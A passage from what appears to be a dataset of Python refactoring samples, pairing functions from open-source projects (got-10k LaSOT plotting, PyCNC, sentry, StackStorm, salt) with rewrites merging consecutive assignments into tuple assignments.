        ax.set(xlabel='Location error threshold',
               ylabel='Precision',
               xlim=(0, thr_ce.max()), ylim=(0, 1),
               title='Precision plots on LaSOT')
        ax.grid(True)
        fig.tight_layout()

        # control ratio
        # ax.set_aspect('equal', 'box')

        print('Saving precision plots to', prec_file)
        fig.savefig(prec_file, dpi=300)

# added by user
        # sort trackers by normalized precision score
        tracker_names = list(performance.keys())
        prec = [t[key]['normalized_precision_score'] for t in performance.values()]
        inds = np.argsort(prec)[::-1]
        tracker_names = [tracker_names[i] for i in inds]

        # plot normalized precision curves
        thr_nce = np.arange(0, self.nbins_nce)
        fig, ax = plt.subplots()
        lines = []
        legends = []
        for i, name in enumerate(tracker_names):
            line, = ax.plot(thr_nce,
                            performance[name][key]['normalized_precision_curve'],
                            markers[i % len(markers)])
            lines.append(line)
            legends.append('%s: [%.3f]' % (name, performance[name][key]['normalized_precision_score']))
        matplotlib.rcParams.update({'font.size': 7.4})
        # legend = ax.legend(lines, legends, loc='center left', bbox_to_anchor=(1, 0.5))
        legend = ax.legend(lines, legends, loc='lower right', bbox_to_anchor=(1., 0.))

        matplotlib.rcParams.update({'font.size': 9})
        ax.set(xlabel='Normalized location error threshold',
               ylabel='Normalized precision',
               xlim=(0, thr_ce.max()), ylim=(0, 1),
               title='Normalized precision plots on LaSOT')
        ax.grid(True)
        fig.tight_layout()

        # control ratio
        # ax.set_aspect('equal', 'box')

        print('Saving normalized precision plots to', norm_prec_file)
        fig.savefig(norm_prec_file, dpi=300)","lines = []
legends = []","lines , legends  = [], []"
toolkit,https://github.com/got-10k/toolkit/tree/master/got10k/experiments/lasot.py,ExperimentLaSOT,plot_curves$163,"def plot_curves(self, tracker_names, extension='.png'):
        # assume tracker_names[0] is your tracker
        report_dir = os.path.join(self.report_dir, tracker_names[0])
        assert os.path.exists(report_dir), \
            'No reports found. Run ""report"" first' \
            'before plotting curves.'
        report_file = os.path.join(report_dir, 'performance.json')
        assert os.path.exists(report_file), \
            'No reports found. Run ""report"" first' \
            'before plotting curves.'

        # load pre-computed performance
        with open(report_file) as f:
            performance = json.load(f)

        succ_file = os.path.join(report_dir, 'success_plots'+extension)
        prec_file = os.path.join(report_dir, 'precision_plots'+extension)
        norm_prec_file = os.path.join(report_dir, 'norm_precision_plots'+extension)
        key = 'overall'

        # markers
        markers = ['-', '--', '-.']
        markers = [c + m for m in markers for c in [''] * 10]

        # filter performance by tracker_names
        performance = {k:v for k,v in performance.items() if k in tracker_names}

        # sort trackers by success score
        tracker_names = list(performance.keys())
        succ = [t[key]['success_score'] for t in performance.values()]
        inds = np.argsort(succ)[::-1]
        tracker_names = [tracker_names[i] for i in inds]

        # plot success curves
        thr_iou = np.linspace(0, 1, self.nbins_iou)
        fig, ax = plt.subplots()
        lines = []
        legends = []
        for i, name in enumerate(tracker_names):
            line, = ax.plot(thr_iou,
                            performance[name][key]['success_curve'],
                            markers[i % len(markers)])
            lines.append(line)
            legends.append('%s: [%.3f]' % (name, performance[name][key]['success_score']))
        matplotlib.rcParams.update({'font.size': 7.4})
        # legend = ax.legend(lines, legends, loc='center left', bbox_to_anchor=(1, 0.5))
        legend = ax.legend(lines, legends, loc='lower left', bbox_to_anchor=(0., 0.))

        matplotlib.rcParams.update({'font.size': 9})
        ax.set(xlabel='Overlap threshold',
               ylabel='Success rate',
               xlim=(0, 1), ylim=(0, 1),
               title='Success plots on LaSOT')
        ax.grid(True)
        fig.tight_layout()

        # control ratio
        # ax.set_aspect('equal', 'box')

        print('Saving success plots to', succ_file)
        fig.savefig(succ_file,
                    bbox_extra_artists=(legend,),
                    bbox_inches='tight',
                    dpi=300)

        # sort trackers by precision score
        tracker_names = list(performance.keys())
        prec = [t[key]['precision_score'] for t in performance.values()]
        inds = np.argsort(prec)[::-1]
        tracker_names = [tracker_names[i] for i in inds]

        # plot precision curves
        thr_ce = np.arange(0, self.nbins_ce)
        fig, ax = plt.subplots()
        lines = []
        legends = []
        for i, name in enumerate(tracker_names):
            line, = ax.plot(thr_ce,
                            performance[name][key]['precision_curve'],
                            markers[i % len(markers)])
            lines.append(line)
            legends.append('%s: [%.3f]' % (name, performance[name][key]['precision_score']))
        matplotlib.rcParams.update({'font.size': 7.4})
        # legend = ax.legend(lines, legends, loc='center left', bbox_to_anchor=(1, 0.5))
        legend = ax.legend(lines, legends, loc='lower right', bbox_to_anchor=(1., 0.))

        matplotlib.rcParams.update({'font.size': 9})
        ax.set(xlabel='Location error threshold',
               ylabel='Precision',
               xlim=(0, thr_ce.max()), ylim=(0, 1),
               title='Precision plots on LaSOT')
        ax.grid(True)
        fig.tight_layout()

        # control ratio
        # ax.set_aspect('equal', 'box')

        print('Saving precision plots to', prec_file)
        fig.savefig(prec_file, dpi=300)

# added by user
        # sort trackers by normalized precision score
        tracker_names = list(performance.keys())
        prec = [t[key]['normalized_precision_score'] for t in performance.values()]
        inds = np.argsort(prec)[::-1]
        tracker_names = [tracker_names[i] for i in inds]

        # plot normalized precision curves
        thr_nce = np.arange(0, self.nbins_nce)
        fig, ax = plt.subplots()
        lines = []
        legends = []
        for i, name in enumerate(tracker_names):
            line, = ax.plot(thr_nce,
                            performance[name][key]['normalized_precision_curve'],
                            markers[i % len(markers)])
            lines.append(line)
            legends.append('%s: [%.3f]' % (name, performance[name][key]['normalized_precision_score']))
        matplotlib.rcParams.update({'font.size': 7.4})
        # legend = ax.legend(lines, legends, loc='center left', bbox_to_anchor=(1, 0.5))
        legend = ax.legend(lines, legends, loc='lower right', bbox_to_anchor=(1., 0.))

        matplotlib.rcParams.update({'font.size': 9})
        ax.set(xlabel='Normalized location error threshold',
               ylabel='Normalized precision',
               xlim=(0, thr_ce.max()), ylim=(0, 1),
               title='Normalized precision plots on LaSOT')
        ax.grid(True)
        fig.tight_layout()

        # control ratio
        # ax.set_aspect('equal', 'box')

        print('Saving normalized precision plots to', norm_prec_file)
        fig.savefig(norm_prec_file, dpi=300)","tracker_names = [tracker_names[i] for i in inds]
thr_ce = np.arange(0, self.nbins_ce)","tracker_names , thr_ce  = [tracker_names[i] for i in inds], np.arange(0, self.nbins_ce)"
toolkit,https://github.com/got-10k/toolkit/tree/master/got10k/experiments/lasot.py,ExperimentLaSOT,plot_curves$163,"def plot_curves(self, tracker_names, extension='.png'):
        # assume tracker_names[0] is your tracker
        report_dir = os.path.join(self.report_dir, tracker_names[0])
        assert os.path.exists(report_dir), \
            'No reports found. Run ""report"" first' \
            'before plotting curves.'
        report_file = os.path.join(report_dir, 'performance.json')
        assert os.path.exists(report_file), \
            'No reports found. Run ""report"" first' \
            'before plotting curves.'

        # load pre-computed performance
        with open(report_file) as f:
            performance = json.load(f)

        succ_file = os.path.join(report_dir, 'success_plots'+extension)
        prec_file = os.path.join(report_dir, 'precision_plots'+extension)
        norm_prec_file = os.path.join(report_dir, 'norm_precision_plots'+extension)
        key = 'overall'

        # markers
        markers = ['-', '--', '-.']
        markers = [c + m for m in markers for c in [''] * 10]

        # filter performance by tracker_names
        performance = {k:v for k,v in performance.items() if k in tracker_names}

        # sort trackers by success score
        tracker_names = list(performance.keys())
        succ = [t[key]['success_score'] for t in performance.values()]
        inds = np.argsort(succ)[::-1]
        tracker_names = [tracker_names[i] for i in inds]

        # plot success curves
        thr_iou = np.linspace(0, 1, self.nbins_iou)
        fig, ax = plt.subplots()
        lines = []
        legends = []
        for i, name in enumerate(tracker_names):
            line, = ax.plot(thr_iou,
                            performance[name][key]['success_curve'],
                            markers[i % len(markers)])
            lines.append(line)
            legends.append('%s: [%.3f]' % (name, performance[name][key]['success_score']))
        matplotlib.rcParams.update({'font.size': 7.4})
        # legend = ax.legend(lines, legends, loc='center left', bbox_to_anchor=(1, 0.5))
        legend = ax.legend(lines, legends, loc='lower left', bbox_to_anchor=(0., 0.))

        matplotlib.rcParams.update({'font.size': 9})
        ax.set(xlabel='Overlap threshold',
               ylabel='Success rate',
               xlim=(0, 1), ylim=(0, 1),
               title='Success plots on LaSOT')
        ax.grid(True)
        fig.tight_layout()

        # control ratio
        # ax.set_aspect('equal', 'box')

        print('Saving success plots to', succ_file)
        fig.savefig(succ_file,
                    bbox_extra_artists=(legend,),
                    bbox_inches='tight',
                    dpi=300)

        # sort trackers by precision score
        tracker_names = list(performance.keys())
        prec = [t[key]['precision_score'] for t in performance.values()]
        inds = np.argsort(prec)[::-1]
        tracker_names = [tracker_names[i] for i in inds]

        # plot precision curves
        thr_ce = np.arange(0, self.nbins_ce)
        fig, ax = plt.subplots()
        lines = []
        legends = []
        for i, name in enumerate(tracker_names):
            line, = ax.plot(thr_ce,
                            performance[name][key]['precision_curve'],
                            markers[i % len(markers)])
            lines.append(line)
            legends.append('%s: [%.3f]' % (name, performance[name][key]['precision_score']))
        matplotlib.rcParams.update({'font.size': 7.4})
        # legend = ax.legend(lines, legends, loc='center left', bbox_to_anchor=(1, 0.5))
        legend = ax.legend(lines, legends, loc='lower right', bbox_to_anchor=(1., 0.))

        matplotlib.rcParams.update({'font.size': 9})
        ax.set(xlabel='Location error threshold',
               ylabel='Precision',
               xlim=(0, thr_ce.max()), ylim=(0, 1),
               title='Precision plots on LaSOT')
        ax.grid(True)
        fig.tight_layout()

        # control ratio
        # ax.set_aspect('equal', 'box')

        print('Saving precision plots to', prec_file)
        fig.savefig(prec_file, dpi=300)

# added by user
        # sort trackers by normalized precision score
        tracker_names = list(performance.keys())
        prec = [t[key]['normalized_precision_score'] for t in performance.values()]
        inds = np.argsort(prec)[::-1]
        tracker_names = [tracker_names[i] for i in inds]

        # plot normalized precision curves
        thr_nce = np.arange(0, self.nbins_nce)
        fig, ax = plt.subplots()
        lines = []
        legends = []
        for i, name in enumerate(tracker_names):
            line, = ax.plot(thr_nce,
                            performance[name][key]['normalized_precision_curve'],
                            markers[i % len(markers)])
            lines.append(line)
            legends.append('%s: [%.3f]' % (name, performance[name][key]['normalized_precision_score']))
        matplotlib.rcParams.update({'font.size': 7.4})
        # legend = ax.legend(lines, legends, loc='center left', bbox_to_anchor=(1, 0.5))
        legend = ax.legend(lines, legends, loc='lower right', bbox_to_anchor=(1., 0.))

        matplotlib.rcParams.update({'font.size': 9})
        ax.set(xlabel='Normalized location error threshold',
               ylabel='Normalized precision',
               xlim=(0, thr_ce.max()), ylim=(0, 1),
               title='Normalized precision plots on LaSOT')
        ax.grid(True)
        fig.tight_layout()

        # control ratio
        # ax.set_aspect('equal', 'box')

        print('Saving normalized precision plots to', norm_prec_file)
        fig.savefig(norm_prec_file, dpi=300)","lines = []
legends = []","lines , legends  = [], []"
toolkit,https://github.com/got-10k/toolkit/tree/master/got10k/experiments/lasot.py,ExperimentLaSOT,plot_curves$163,"def plot_curves(self, tracker_names, extension='.png'):
        # assume tracker_names[0] is your tracker
        report_dir = os.path.join(self.report_dir, tracker_names[0])
        assert os.path.exists(report_dir), \
            'No reports found. Run ""report"" first' \
            'before plotting curves.'
        report_file = os.path.join(report_dir, 'performance.json')
        assert os.path.exists(report_file), \
            'No reports found. Run ""report"" first' \
            'before plotting curves.'

        # load pre-computed performance
        with open(report_file) as f:
            performance = json.load(f)

        succ_file = os.path.join(report_dir, 'success_plots'+extension)
        prec_file = os.path.join(report_dir, 'precision_plots'+extension)
        norm_prec_file = os.path.join(report_dir, 'norm_precision_plots'+extension)
        key = 'overall'

        # markers
        markers = ['-', '--', '-.']
        markers = [c + m for m in markers for c in [''] * 10]

        # filter performance by tracker_names
        performance = {k:v for k,v in performance.items() if k in tracker_names}

        # sort trackers by success score
        tracker_names = list(performance.keys())
        succ = [t[key]['success_score'] for t in performance.values()]
        inds = np.argsort(succ)[::-1]
        tracker_names = [tracker_names[i] for i in inds]

        # plot success curves
        thr_iou = np.linspace(0, 1, self.nbins_iou)
        fig, ax = plt.subplots()
        lines = []
        legends = []
        for i, name in enumerate(tracker_names):
            line, = ax.plot(thr_iou,
                            performance[name][key]['success_curve'],
                            markers[i % len(markers)])
            lines.append(line)
            legends.append('%s: [%.3f]' % (name, performance[name][key]['success_score']))
        matplotlib.rcParams.update({'font.size': 7.4})
        # legend = ax.legend(lines, legends, loc='center left', bbox_to_anchor=(1, 0.5))
        legend = ax.legend(lines, legends, loc='lower left', bbox_to_anchor=(0., 0.))

        matplotlib.rcParams.update({'font.size': 9})
        ax.set(xlabel='Overlap threshold',
               ylabel='Success rate',
               xlim=(0, 1), ylim=(0, 1),
               title='Success plots on LaSOT')
        ax.grid(True)
        fig.tight_layout()

        # control ratio
        # ax.set_aspect('equal', 'box')

        print('Saving success plots to', succ_file)
        fig.savefig(succ_file,
                    bbox_extra_artists=(legend,),
                    bbox_inches='tight',
                    dpi=300)

        # sort trackers by precision score
        tracker_names = list(performance.keys())
        prec = [t[key]['precision_score'] for t in performance.values()]
        inds = np.argsort(prec)[::-1]
        tracker_names = [tracker_names[i] for i in inds]

        # plot precision curves
        thr_ce = np.arange(0, self.nbins_ce)
        fig, ax = plt.subplots()
        lines = []
        legends = []
        for i, name in enumerate(tracker_names):
            line, = ax.plot(thr_ce,
                            performance[name][key]['precision_curve'],
                            markers[i % len(markers)])
            lines.append(line)
            legends.append('%s: [%.3f]' % (name, performance[name][key]['precision_score']))
        matplotlib.rcParams.update({'font.size': 7.4})
        # legend = ax.legend(lines, legends, loc='center left', bbox_to_anchor=(1, 0.5))
        legend = ax.legend(lines, legends, loc='lower right', bbox_to_anchor=(1., 0.))

        matplotlib.rcParams.update({'font.size': 9})
        ax.set(xlabel='Location error threshold',
               ylabel='Precision',
               xlim=(0, thr_ce.max()), ylim=(0, 1),
               title='Precision plots on LaSOT')
        ax.grid(True)
        fig.tight_layout()

        # control ratio
        # ax.set_aspect('equal', 'box')

        print('Saving precision plots to', prec_file)
        fig.savefig(prec_file, dpi=300)

# added by user
        # sort trackers by normalized precision score
        tracker_names = list(performance.keys())
        prec = [t[key]['normalized_precision_score'] for t in performance.values()]
        inds = np.argsort(prec)[::-1]
        tracker_names = [tracker_names[i] for i in inds]

        # plot normalized precision curves
        thr_nce = np.arange(0, self.nbins_nce)
        fig, ax = plt.subplots()
        lines = []
        legends = []
        for i, name in enumerate(tracker_names):
            line, = ax.plot(thr_nce,
                            performance[name][key]['normalized_precision_curve'],
                            markers[i % len(markers)])
            lines.append(line)
            legends.append('%s: [%.3f]' % (name, performance[name][key]['normalized_precision_score']))
        matplotlib.rcParams.update({'font.size': 7.4})
        # legend = ax.legend(lines, legends, loc='center left', bbox_to_anchor=(1, 0.5))
        legend = ax.legend(lines, legends, loc='lower right', bbox_to_anchor=(1., 0.))

        matplotlib.rcParams.update({'font.size': 9})
        ax.set(xlabel='Normalized location error threshold',
               ylabel='Normalized precision',
               xlim=(0, thr_ce.max()), ylim=(0, 1),
               title='Normalized precision plots on LaSOT')
        ax.grid(True)
        fig.tight_layout()

        # control ratio
        # ax.set_aspect('equal', 'box')

        print('Saving normalized precision plots to', norm_prec_file)
        fig.savefig(norm_prec_file, dpi=300)","tracker_names = [tracker_names[i] for i in inds]
thr_nce = np.arange(0, self.nbins_nce)","tracker_names , thr_nce  = [tracker_names[i] for i in inds], np.arange(0, self.nbins_nce)"
toolkit,https://github.com/got-10k/toolkit/tree/master/got10k/experiments/lasot.py,ExperimentLaSOT,plot_curves$163,"def plot_curves(self, tracker_names, extension='.png'):
        # assume tracker_names[0] is your tracker
        report_dir = os.path.join(self.report_dir, tracker_names[0])
        assert os.path.exists(report_dir), \
            'No reports found. Run ""report"" first' \
            'before plotting curves.'
        report_file = os.path.join(report_dir, 'performance.json')
        assert os.path.exists(report_file), \
            'No reports found. Run ""report"" first' \
            'before plotting curves.'

        # load pre-computed performance
        with open(report_file) as f:
            performance = json.load(f)

        succ_file = os.path.join(report_dir, 'success_plots'+extension)
        prec_file = os.path.join(report_dir, 'precision_plots'+extension)
        norm_prec_file = os.path.join(report_dir, 'norm_precision_plots'+extension)
        key = 'overall'

        # markers
        markers = ['-', '--', '-.']
        markers = [c + m for m in markers for c in [''] * 10]

        # filter performance by tracker_names
        performance = {k:v for k,v in performance.items() if k in tracker_names}

        # sort trackers by success score
        tracker_names = list(performance.keys())
        succ = [t[key]['success_score'] for t in performance.values()]
        inds = np.argsort(succ)[::-1]
        tracker_names = [tracker_names[i] for i in inds]

        # plot success curves
        thr_iou = np.linspace(0, 1, self.nbins_iou)
        fig, ax = plt.subplots()
        lines = []
        legends = []
        for i, name in enumerate(tracker_names):
            line, = ax.plot(thr_iou,
                            performance[name][key]['success_curve'],
                            markers[i % len(markers)])
            lines.append(line)
            legends.append('%s: [%.3f]' % (name, performance[name][key]['success_score']))
        matplotlib.rcParams.update({'font.size': 7.4})
        # legend = ax.legend(lines, legends, loc='center left', bbox_to_anchor=(1, 0.5))
        legend = ax.legend(lines, legends, loc='lower left', bbox_to_anchor=(0., 0.))

        matplotlib.rcParams.update({'font.size': 9})
        ax.set(xlabel='Overlap threshold',
               ylabel='Success rate',
               xlim=(0, 1), ylim=(0, 1),
               title='Success plots on LaSOT')
        ax.grid(True)
        fig.tight_layout()

        # control ratio
        # ax.set_aspect('equal', 'box')

        print('Saving success plots to', succ_file)
        fig.savefig(succ_file,
                    bbox_extra_artists=(legend,),
                    bbox_inches='tight',
                    dpi=300)

        # sort trackers by precision score
        tracker_names = list(performance.keys())
        prec = [t[key]['precision_score'] for t in performance.values()]
        inds = np.argsort(prec)[::-1]
        tracker_names = [tracker_names[i] for i in inds]

        # plot precision curves
        thr_ce = np.arange(0, self.nbins_ce)
        fig, ax = plt.subplots()
        lines = []
        legends = []
        for i, name in enumerate(tracker_names):
            line, = ax.plot(thr_ce,
                            performance[name][key]['precision_curve'],
                            markers[i % len(markers)])
            lines.append(line)
            legends.append('%s: [%.3f]' % (name, performance[name][key]['precision_score']))
        matplotlib.rcParams.update({'font.size': 7.4})
        # legend = ax.legend(lines, legends, loc='center left', bbox_to_anchor=(1, 0.5))
        legend = ax.legend(lines, legends, loc='lower right', bbox_to_anchor=(1., 0.))

        matplotlib.rcParams.update({'font.size': 9})
        ax.set(xlabel='Location error threshold',
               ylabel='Precision',
               xlim=(0, thr_ce.max()), ylim=(0, 1),
               title='Precision plots on LaSOT')
        ax.grid(True)
        fig.tight_layout()

        # control ratio
        # ax.set_aspect('equal', 'box')

        print('Saving precision plots to', prec_file)
        fig.savefig(prec_file, dpi=300)

# added by user
        # sort trackers by normalized precision score
        tracker_names = list(performance.keys())
        prec = [t[key]['normalized_precision_score'] for t in performance.values()]
        inds = np.argsort(prec)[::-1]
        tracker_names = [tracker_names[i] for i in inds]

        # plot normalized precision curves
        thr_nce = np.arange(0, self.nbins_nce)
        fig, ax = plt.subplots()
        lines = []
        legends = []
        for i, name in enumerate(tracker_names):
            line, = ax.plot(thr_nce,
                            performance[name][key]['normalized_precision_curve'],
                            markers[i % len(markers)])
            lines.append(line)
            legends.append('%s: [%.3f]' % (name, performance[name][key]['normalized_precision_score']))
        matplotlib.rcParams.update({'font.size': 7.4})
        # legend = ax.legend(lines, legends, loc='center left', bbox_to_anchor=(1, 0.5))
        legend = ax.legend(lines, legends, loc='lower right', bbox_to_anchor=(1., 0.))

        matplotlib.rcParams.update({'font.size': 9})
        ax.set(xlabel='Normalized location error threshold',
               ylabel='Normalized precision',
               xlim=(0, thr_ce.max()), ylim=(0, 1),
               title='Normalized precision plots on LaSOT')
        ax.grid(True)
        fig.tight_layout()

        # control ratio
        # ax.set_aspect('equal', 'box')

        print('Saving normalized precision plots to', norm_prec_file)
        fig.savefig(norm_prec_file, dpi=300)","lines = []
legends = []","lines , legends  = [], []"
PyCNC,https://github.com/Nikolay-Kha/PyCNC/tree/master/cnc/pulses.py,PulseGeneratorLinear,_interpolation_function$310,"def _interpolation_function(self, ix, iy, iz, ie):
        """""" Calculate interpolation values for linear movement, see super class
            for details.
        """"""
        t_x = self.__linear(ix, STEPPER_PULSES_PER_MM_X, self._total_pulses_x,
                            self.max_velocity_mm_per_sec.x)
        t_y = self.__linear(iy, STEPPER_PULSES_PER_MM_Y, self._total_pulses_y,
                            self.max_velocity_mm_per_sec.y)
        t_z = self.__linear(iz, STEPPER_PULSES_PER_MM_Z, self._total_pulses_z,
                            self.max_velocity_mm_per_sec.z)
        t_e = self.__linear(ie, STEPPER_PULSES_PER_MM_E, self._total_pulses_e,
                            self.max_velocity_mm_per_sec.e)
        return self._direction, (t_x, t_y, t_z, t_e)","t_x = self.__linear(ix, STEPPER_PULSES_PER_MM_X, self._total_pulses_x, self.max_velocity_mm_per_sec.x)
t_y = self.__linear(iy, STEPPER_PULSES_PER_MM_Y, self._total_pulses_y, self.max_velocity_mm_per_sec.y)
t_z = self.__linear(iz, STEPPER_PULSES_PER_MM_Z, self._total_pulses_z, self.max_velocity_mm_per_sec.z)
t_e = self.__linear(ie, STEPPER_PULSES_PER_MM_E, self._total_pulses_e, self.max_velocity_mm_per_sec.e)","t_x , t_y , t_z , t_e  = self.__linear(ix, STEPPER_PULSES_PER_MM_X, self._total_pulses_x, self.max_velocity_mm_per_sec.x), self.__linear(iy, STEPPER_PULSES_PER_MM_Y, self._total_pulses_y, self.max_velocity_mm_per_sec.y), self.__linear(iz, STEPPER_PULSES_PER_MM_Z, self._total_pulses_z, self.max_velocity_mm_per_sec.z), self.__linear(ie, STEPPER_PULSES_PER_MM_E, self._total_pulses_e, self.max_velocity_mm_per_sec.e)"
sentry,https://github.com/getsentry/sentry/tree/master/src/sentry/api/paginator.py,CombinedQuerysetPaginator,__init__$552,"def __init__(self, intermediaries, desc=False, on_results=None, case_insensitive=False):
        self.desc = desc
        self.intermediaries = intermediaries
        self.on_results = on_results
        self.case_insensitive = case_insensitive
        for intermediary in list(self.intermediaries):
            if intermediary.is_empty:
                self.intermediaries.remove(intermediary)
            else:
                self.model_key_map[intermediary.instance_type] = intermediary.order_by

        # This is an assertion to make sure date field sorts are all or nothing.###
        # (i.e. all fields must be a date type, or none of them)
        using_other = False
        for intermediary in self.intermediaries:
            if intermediary.order_by_type is datetime:
                self.using_dates = True
            else:
                using_other = True

        if self.using_dates:
            assert (
                not using_other
            ), ""When sorting by a date, it must be the key used on all intermediaries""","self.desc = desc
self.intermediaries = intermediaries
self.on_results = on_results
self.case_insensitive = case_insensitive","self.desc , self.intermediaries , self.on_results , self.case_insensitive  = desc, intermediaries, on_results, case_insensitive"
st2,https://github.com/StackStorm/st2/tree/master/st2common/st2common/services/workflows.py,,inspect_task_contents$134,"def inspect_task_contents(wf_spec):
    result = []
    spec_path = ""tasks""
    schema_path = ""properties.tasks.patternProperties.^\\w+$""
    action_schema_path = schema_path + "".properties.action""
    action_input_schema_path = schema_path + "".properties.input""

    def is_action_an_expression(action):
        if isinstance(action, six.string_types):
            for name, evaluator in six.iteritems(expressions.get_evaluators()):
                if evaluator.has_expressions(action):
                    return True

    for task_name, task_spec in six.iteritems(wf_spec.tasks):
        action_ref = getattr(task_spec, ""action"", None)
        action_spec_path = spec_path + ""."" + task_name + "".action""
        action_input_spec_path = spec_path + ""."" + task_name + "".input""

        # Move on if action is empty or an expression.
        if not action_ref or is_action_an_expression(action_ref):
            continue

        # Check that the format of the action is a valid resource reference.
        if not sys_models.ResourceReference.is_resource_reference(action_ref):
            entry = {
                ""type"": ""content"",
                ""message"": 'The action reference ""%s"" is not formatted correctly.'
                % action_ref,
                ""spec_path"": action_spec_path,
                ""schema_path"": action_schema_path,
            }

            result.append(entry)
            continue

        # Check that the action is registered in the database.
        if not action_utils.get_action_by_ref(ref=action_ref):
            entry = {
                ""type"": ""content"",
                ""message"": 'The action ""%s"" is not registered in the database.'
                % action_ref,
                ""spec_path"": action_spec_path,
                ""schema_path"": action_schema_path,
            }

            result.append(entry)
            continue

        # Check the action parameters.
        params = getattr(task_spec, ""input"", None) or {}

        if params and not isinstance(params, dict):
            continue

        requires, unexpected = action_param_utils.validate_action_parameters(
            action_ref, params
        )

        for param in requires:
            message = 'Action ""%s"" is missing required input ""%s"".' % (
                action_ref,
                param,
            )

            entry = {
                ""type"": ""content"",
                ""message"": message,
                ""spec_path"": action_input_spec_path,
                ""schema_path"": action_input_schema_path,
            }

            result.append(entry)

        for param in unexpected:
            message = 'Action ""%s"" has unexpected input ""%s"".' % (action_ref, param)

            entry = {
                ""type"": ""content"",
                ""message"": message,
                ""spec_path"": action_input_spec_path + ""."" + param,
                ""schema_path"": action_input_schema_path + "".patternProperties.^\\w+$"",
            }

            result.append(entry)

    return result","result = []
spec_path = 'tasks'
schema_path = 'properties.tasks.patternProperties.^\\w+$'","result , spec_path , schema_path  = [], 'tasks', 'properties.tasks.patternProperties.^\\w+$'"
st2,https://github.com/StackStorm/st2/tree/master/st2common/st2common/services/workflows.py,,inspect_task_contents$134,"def inspect_task_contents(wf_spec):
    result = []
    spec_path = ""tasks""
    schema_path = ""properties.tasks.patternProperties.^\\w+$""
    action_schema_path = schema_path + "".properties.action""
    action_input_schema_path = schema_path + "".properties.input""

    def is_action_an_expression(action):
        if isinstance(action, six.string_types):
            for name, evaluator in six.iteritems(expressions.get_evaluators()):
                if evaluator.has_expressions(action):
                    return True

    for task_name, task_spec in six.iteritems(wf_spec.tasks):
        action_ref = getattr(task_spec, ""action"", None)
        action_spec_path = spec_path + ""."" + task_name + "".action""
        action_input_spec_path = spec_path + ""."" + task_name + "".input""

        # Move on if action is empty or an expression.
        if not action_ref or is_action_an_expression(action_ref):
            continue

        # Check that the format of the action is a valid resource reference.
        if not sys_models.ResourceReference.is_resource_reference(action_ref):
            entry = {
                ""type"": ""content"",
                ""message"": 'The action reference ""%s"" is not formatted correctly.'
                % action_ref,
                ""spec_path"": action_spec_path,
                ""schema_path"": action_schema_path,
            }

            result.append(entry)
            continue

        # Check that the action is registered in the database.
        if not action_utils.get_action_by_ref(ref=action_ref):
            entry = {
                ""type"": ""content"",
                ""message"": 'The action ""%s"" is not registered in the database.'
                % action_ref,
                ""spec_path"": action_spec_path,
                ""schema_path"": action_schema_path,
            }

            result.append(entry)
            continue

        # Check the action parameters.
        params = getattr(task_spec, ""input"", None) or {}

        if params and not isinstance(params, dict):
            continue

        requires, unexpected = action_param_utils.validate_action_parameters(
            action_ref, params
        )

        for param in requires:
            message = 'Action ""%s"" is missing required input ""%s"".' % (
                action_ref,
                param,
            )

            entry = {
                ""type"": ""content"",
                ""message"": message,
                ""spec_path"": action_input_spec_path,
                ""schema_path"": action_input_schema_path,
            }

            result.append(entry)

        for param in unexpected:
            message = 'Action ""%s"" has unexpected input ""%s"".' % (action_ref, param)

            entry = {
                ""type"": ""content"",
                ""message"": message,
                ""spec_path"": action_input_spec_path + ""."" + param,
                ""schema_path"": action_input_schema_path + "".patternProperties.^\\w+$"",
            }

            result.append(entry)

    return result","action_schema_path = schema_path + '.properties.action'
action_input_schema_path = schema_path + '.properties.input'","action_schema_path , action_input_schema_path  = schema_path + '.properties.action', schema_path + '.properties.input'"
st2,https://github.com/StackStorm/st2/tree/master/st2common/st2common/services/workflows.py,,inspect_task_contents$134,"def inspect_task_contents(wf_spec):
    result = []
    spec_path = ""tasks""
    schema_path = ""properties.tasks.patternProperties.^\\w+$""
    action_schema_path = schema_path + "".properties.action""
    action_input_schema_path = schema_path + "".properties.input""

    def is_action_an_expression(action):
        if isinstance(action, six.string_types):
            for name, evaluator in six.iteritems(expressions.get_evaluators()):
                if evaluator.has_expressions(action):
                    return True

    for task_name, task_spec in six.iteritems(wf_spec.tasks):
        action_ref = getattr(task_spec, ""action"", None)
        action_spec_path = spec_path + ""."" + task_name + "".action""
        action_input_spec_path = spec_path + ""."" + task_name + "".input""

        # Move on if action is empty or an expression.
        if not action_ref or is_action_an_expression(action_ref):
            continue

        # Check that the format of the action is a valid resource reference.
        if not sys_models.ResourceReference.is_resource_reference(action_ref):
            entry = {
                ""type"": ""content"",
                ""message"": 'The action reference ""%s"" is not formatted correctly.'
                % action_ref,
                ""spec_path"": action_spec_path,
                ""schema_path"": action_schema_path,
            }

            result.append(entry)
            continue

        # Check that the action is registered in the database.
        if not action_utils.get_action_by_ref(ref=action_ref):
            entry = {
                ""type"": ""content"",
                ""message"": 'The action ""%s"" is not registered in the database.'
                % action_ref,
                ""spec_path"": action_spec_path,
                ""schema_path"": action_schema_path,
            }

            result.append(entry)
            continue

        # Check the action parameters.
        params = getattr(task_spec, ""input"", None) or {}

        if params and not isinstance(params, dict):
            continue

        requires, unexpected = action_param_utils.validate_action_parameters(
            action_ref, params
        )

        for param in requires:
            message = 'Action ""%s"" is missing required input ""%s"".' % (
                action_ref,
                param,
            )

            entry = {
                ""type"": ""content"",
                ""message"": message,
                ""spec_path"": action_input_spec_path,
                ""schema_path"": action_input_schema_path,
            }

            result.append(entry)

        for param in unexpected:
            message = 'Action ""%s"" has unexpected input ""%s"".' % (action_ref, param)

            entry = {
                ""type"": ""content"",
                ""message"": message,
                ""spec_path"": action_input_spec_path + ""."" + param,
                ""schema_path"": action_input_schema_path + "".patternProperties.^\\w+$"",
            }

            result.append(entry)

    return result","action_ref = getattr(task_spec, 'action', None)
action_spec_path = spec_path + '.' + task_name + '.action'
action_input_spec_path = spec_path + '.' + task_name + '.input'","action_ref , action_spec_path , action_input_spec_path  = getattr(task_spec, 'action', None), spec_path + '.' + task_name + '.action', spec_path + '.' + task_name + '.input'"
salt,https://github.com/saltstack/salt/tree/master/salt/modules/beacons.py,,reset$744,"def reset(**kwargs):
    """"""
    Reset beacon configuration on the minion

    CLI Example:

    .. code-block:: bash

        salt '*' beacons.reset
    """"""

    ret = {""comment"": [], ""result"": True}

    if kwargs.get(""test""):
        ret[""comment""] = ""Beacons would be reset.""
    else:
        try:
            with salt.utils.event.get_event(
                ""minion"", opts=__opts__, listen=True
            ) as event_bus:
                res = __salt__[""event.fire""]({""func"": ""reset""}, ""manage_beacons"")
                if res:
                    event_ret = event_bus.get_event(
